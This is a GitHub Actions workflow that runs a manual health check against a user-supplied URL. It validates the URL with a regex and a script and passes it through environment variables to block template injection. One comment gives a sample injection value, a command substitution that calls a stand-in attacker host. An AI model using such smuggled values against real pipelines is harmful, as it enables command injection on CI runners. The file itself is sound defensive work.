name: health-monitor

# Manual health check against an explicitly supplied live deployment.
# A hosted GitHub runner cannot reach the developer's 127.0.0.1.
on:
  workflow_dispatch:
    inputs:
      host:
        description: 'Health base URL'
        required: true

permissions:
  contents: read
  issues: write

jobs:
  monitor:
    runs-on: ubuntu-latest
    env:
      # Valid URL pattern: https?://hostname[:port][/path]
      # Rejects shell metacharacters like $(), ;, |, `, etc.
      HOST_REGEX: '^(https?://[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?([a-zA-Z0-9-.]*[a-zA-Z0-9])?(:\d+)?(/[a-zA-Z0-9-._/]*)?)$'
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      # Validate host input against safe URL pattern BEFORE use.
      # Prevents template-injection: a value like $(curl evil.com) is rejected.
      - name: validate-host
        run: python3 scripts/validate_host.py "$HOST_INPUT"
        env:
          HOST_INPUT: ${{ github.event.inputs.host }}
      # Safe: host is validated above, passed as env var (not shell interpolation).
      - name: run-health-check
        run: python3 scripts/health_monitor.py --host "$HEALTH_HOST" --repo ${{ github.repository }}
        env:
          HEALTH_HOST: ${{ github.event.inputs.host }}
